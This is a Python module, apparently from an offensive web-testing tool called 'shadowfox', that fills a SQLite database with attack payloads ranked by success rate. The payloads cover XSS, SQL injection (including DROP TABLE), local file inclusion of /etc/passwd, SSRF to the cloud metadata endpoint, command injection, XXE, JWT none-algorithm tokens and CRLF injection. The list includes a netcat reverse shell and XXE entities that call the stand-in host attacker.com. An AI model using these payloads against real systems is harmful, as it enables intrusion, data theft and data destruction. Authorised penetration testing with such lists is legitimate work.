# shadowfox/core/payload_library.py

import sqlite3
import json
import logging
from typing import Dict, List, Any
from datetime import datetime

class PayloadLibrary:
    """
    Biblioteka payload-a za različite tipove napada.
    Automatski popunjava bazu sa osnovnim payload-ima.
    """
    
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('PayloadLibrary')
        self._init_base_payloads()
    
    def _init_base_payloads(self):
        """Inicijalizuje osnovne payload-e u bazi"""
        base_payloads = self._get_base_payloads()
        
        try:
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                # Proveri da li već postoje payload-i
                cursor = conn.execute("SELECT COUNT(*) FROM payload_library")
                count = cursor.fetchone()[0]
                
                if count == 0:
                    self.logger.info("Popunjavam payload biblioteku...")
                    
                    for payload_type, payloads in base_payloads.items():
                        for payload_data in payloads:
                            conn.execute('''
                                INSERT INTO payload_library (payload_type, payload, description, success_rate)
                                VALUES (?, ?, ?, ?)
                            ''', (payload_type, payload_data['payload'], 
                                  payload_data['description'], payload_data.get('success_rate', 0.0)))
                    
                    self.logger.info(f"Dodano {sum(len(v) for v in base_payloads.values())} payload-a")
                else:
                    self.logger.info(f"Payload biblioteka već sadrži {count} payload-a")
                    
        except Exception as e:
            self.logger.error(f"Greška pri inicijalizaciji payload-a: {e}")
    
    def _get_base_payloads(self) -> Dict[str, List[Dict]]:
        """Vraća osnovne payload-e za sve tipove napada"""
        
        return {
            "XSS": [
                {
                    "payload": "<script>alert('XSS')</script>",
                    "description": "Basic XSS alert",
                    "success_rate": 0.7
                },
                {
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "description": "Image onerror XSS",
                    "success_rate": 0.8
                },
                {
                    "payload": "<svg onload=alert('XSS')>",
                    "description": "SVG onload XSS",
                    "success_rate": 0.6
                },
                {
                    "payload": "javascript:alert('XSS')",
                    "description": "JavaScript protocol XSS",
                    "success_rate": 0.4
                },
                {
                    "payload": "'\"><script>alert('XSS')</script>",
                    "description": "Quote breaking XSS",
                    "success_rate": 0.8
                },
                {
                    "payload": "<iframe src=javascript:alert('XSS')>",
                    "description": "Iframe JavaScript XSS",
                    "success_rate": 0.5
                },
                {
                    "payload": "<body onload=alert('XSS')>",
                    "description": "Body onload XSS",
                    "success_rate": 0.3
                },
                {
                    "payload": "<input onfocus=alert('XSS') autofocus>",
                    "description": "Input autofocus XSS",
                    "success_rate": 0.6
                }
            ],
            
            "SQLi": [
                {
                    "payload": "' OR '1'='1",
                    "description": "Classic OR SQLi",
                    "success_rate": 0.7
                },
                {
                    "payload": "' OR 1=1--",
                    "description": "OR SQLi with comment",
                    "success_rate": 0.8
                },
                {
                    "payload": "' UNION SELECT NULL--",
                    "description": "UNION SQLi test",
                    "success_rate": 0.6
                },
                {
                    "payload": "'; DROP TABLE users--",
                    "description": "DROP table SQLi",
                    "success_rate": 0.2
                },
                {
                    "payload": "' AND 1=2 UNION SELECT 1,2,3--",
                    "description": "UNION SELECT enumeration",
                    "success_rate": 0.5
                },
                {
                    "payload": "' OR SLEEP(5)--",
                    "description": "Time-based blind SQLi",
                    "success_rate": 0.6
                },
                {
                    "payload": "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "description": "Boolean blind SQLi",
                    "success_rate": 0.4
                },
                {
                    "payload": "1' ORDER BY 1--",
                    "description": "ORDER BY column discovery",
                    "success_rate": 0.7
                }
            ],
            
            "LFI": [
                {
                    "payload": "../../../etc/passwd",
                    "description": "Basic LFI - passwd file",
                    "success_rate": 0.6
                },
                {
                    "payload": "....//....//....//etc/passwd",
                    "description": "Double URL encoding LFI",
                    "success_rate": 0.4
                },
                {
                    "payload": "/etc/passwd%00",
                    "description": "Null byte LFI",
                    "success_rate": 0.3
                },
                {
                    "payload": "php://filter/convert.base64-encode/resource=index.php",
                    "description": "PHP filter LFI",
                    "success_rate": 0.7
                },
                {
                    "payload": "file:///etc/passwd",
                    "description": "File protocol LFI",
                    "success_rate": 0.5
                },
                {
                    "payload": "../../../windows/system32/drivers/etc/hosts",
                    "description": "Windows hosts file LFI",
                    "success_rate": 0.4
                },
                {
                    "payload": "data://text/plain,<?php system($_GET['cmd']); ?>",
                    "description": "Data wrapper RCE",
                    "success_rate": 0.3
                }
            ],
            
            "SSRF": [
                {
                    "payload": "http://localhost:80",
                    "description": "Basic localhost SSRF",
                    "success_rate": 0.6
                },
                {
                    "payload": "http://127.0.0.1:22",
                    "description": "Loopback SSH SSRF",
                    "success_rate": 0.5
                },
                {
                    "payload": "http://169.254.169.254/latest/meta-data/",
                    "description": "AWS metadata SSRF",
                    "success_rate": 0.7
                },
                {
                    "payload": "file:///etc/passwd",
                    "description": "File protocol SSRF",
                    "success_rate": 0.4
                },
                {
                    "payload": "gopher://127.0.0.1:3306/",
                    "description": "Gopher protocol SSRF",
                    "success_rate": 0.3
                },
                {
                    "payload": "http://[::1]:80",
                    "description": "IPv6 localhost SSRF",
                    "success_rate": 0.4
                },
                {
                    "payload": "http://0.0.0.0:80",
                    "description": "All interfaces SSRF",
                    "success_rate": 0.5
                }
            ],
            
            "RCE": [
                {
                    "payload": "; ls -la",
                    "description": "Command injection - ls",
                    "success_rate": 0.5
                },
                {
                    "payload": "| whoami",
                    "description": "Pipe command injection",
                    "success_rate": 0.6
                },
                {
                    "payload": "&& id",
                    "description": "AND command injection",
                    "success_rate": 0.7
                },
                {
                    "payload": "`id`",
                    "description": "Backtick command injection",
                    "success_rate": 0.4
                },
                {
                    "payload": "$(whoami)",
                    "description": "Dollar command substitution",
                    "success_rate": 0.5
                },
                {
                    "payload": "; cat /etc/passwd",
                    "description": "File read via command injection",
                    "success_rate": 0.4
                },
                {
                    "payload": "| nc -e /bin/sh attacker.com 4444",
                    "description": "Reverse shell attempt",
                    "success_rate": 0.2
                }
            ],
            
            "XXE": [
                {
                    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                    "description": "Basic XXE file read",
                    "success_rate": 0.5
                },
                {
                    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/'>]><foo>&xxe;</foo>",
                    "description": "XXE SSRF",
                    "success_rate": 0.4
                },
                {
                    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/malicious.dtd'>%xxe;]>",
                    "description": "External DTD XXE",
                    "success_rate": 0.3
                }
            ],
            
            "IDOR": [
                {
                    "payload": "1",
                    "description": "Basic IDOR test - ID 1",
                    "success_rate": 0.8
                },
                {
                    "payload": "0",
                    "description": "IDOR test - ID 0",
                    "success_rate": 0.6
                },
                {
                    "payload": "-1",
                    "description": "Negative ID IDOR",
                    "success_rate": 0.4
                },
                {
                    "payload": "999999",
                    "description": "High ID IDOR",
                    "success_rate": 0.5
                },
                {
                    "payload": "admin",
                    "description": "Username IDOR",
                    "success_rate": 0.3
                }
            ],
            
            "JWT": [
                {
                    "payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                    "description": "JWT none algorithm",
                    "success_rate": 0.3
                },
                {
                    "payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature",
                    "description": "JWT signature tampering",
                    "success_rate": 0.4
                }
            ],
            
            "CRLF": [
                {
                    "payload": "%0d%0aSet-Cookie: admin=true",
                    "description": "CRLF header injection",
                    "success_rate": 0.4
                },
                {
                    "payload": "%0a%0d%0a%0d<script>alert('XSS')</script>",
                    "description": "CRLF to XSS",
                    "success_rate": 0.3
                }
            ]
        }
    
    def get_payloads_by_type(self, payload_type: str, limit: int = None) -> List[Dict]:
        """Vraća payload-e određenog tipa"""
        return self.operator.get_payloads_by_type(payload_type)[:limit] if limit else self.operator.get_payloads_by_type(payload_type)
    
    def add_custom_payload(self, payload_type: str, payload: str, description: str, success_rate: float = 0.0):
        """Dodaje custom payload u biblioteku"""
        try:
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                conn.execute('''
                    INSERT INTO payload_library (payload_type, payload, description, success_rate)
                    VALUES (?, ?, ?, ?)
                ''', (payload_type, payload, description, success_rate))
                
            self.logger.info(f"Dodat custom {payload_type} payload")
            
        except Exception as e:
            self.logger.error(f"Greška pri dodavanju payload-a: {e}")
    
    def update_payload_success_rate(self, payload_id: int, new_rate: float):
        """Ažurira success rate payload-a na osnovu rezultata"""
        try:
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                conn.execute('''
                    UPDATE payload_library SET success_rate = ? WHERE id = ?
                ''', (new_rate, payload_id))
                
        except Exception as e:
            self.logger.error(f"Greška pri ažuriranju success rate: {e}")
    
    def get_top_payloads_by_success(self, payload_type: str, limit: int = 5) -> List[Dict]:
        """Vraća najbolje payload-e po success rate"""
        try:
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.execute('''
                    SELECT * FROM payload_library 
                    WHERE payload_type = ? 
                    ORDER BY success_rate DESC 
                    LIMIT ?
                ''', (payload_type, limit))
                
                return [dict(row) for row in cursor.fetchall()]
                
        except Exception as e:
            self.logger.error(f"Greška pri čitanju top payload-a: {e}")
            return []
    
    def search_payloads(self, search_term: str) -> List[Dict]:
        """Pretražuje payload-e po opisu ili payload-u"""
        try:
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.execute('''
                    SELECT * FROM payload_library 
                    WHERE payload LIKE ? OR description LIKE ?
                    ORDER BY success_rate DESC
                ''', (f'%{search_term}%', f'%{search_term}%'))
                
                return [dict(row) for row in cursor.fetchall()]
                
        except Exception as e:
            self.logger.error(f"Greška pri pretrazi payload-a: {e}")
            return []
    
    def get_payload_stats(self) -> Dict:
        """Vraća statistike o payload biblioteci"""
        try:
            with sqlite3.connect(self.operator.shadowfox_db) as conn:
                # Ukupan broj payload-a po tipu
                cursor = conn.execute('''
                    SELECT payload_type, COUNT(*) as count, AVG(success_rate) as avg_success
                    FROM payload_library 
                    GROUP BY payload_type
                    ORDER BY count DESC
                ''')
                
                stats = {}
                total_payloads = 0
                
                for row in cursor.fetchall():
                    payload_type, count, avg_success = row
                    stats[payload_type] = {
                        "count": count,
                        "avg_success_rate": round(avg_success, 2)
                    }
                    total_payloads += count
                
                stats["total"] = total_payloads
                return stats
                
        except Exception as e:
            self.logger.error(f"Greška pri čitanju statistika: {e}")
            return {}

# Test funkcionalnosti
if __name__ == "__main__":
    from operator import ShadowFoxOperator
    
    # Test
    op = ShadowFoxOperator()
    payload_lib = PayloadLibrary(op)
    
    # Statistike
    stats = payload_lib.get_payload_stats()
    print("Payload statistike:")
    print(json.dumps(stats, indent=2))
    
    # Top XSS payload-i
    top_xss = payload_lib.get_top_payloads_by_success("XSS", 3)
    print(f"\nTop 3 XSS payload-a:")
    for payload in top_xss:
        print(f"- {payload['payload']} (success: {payload['success_rate']})")
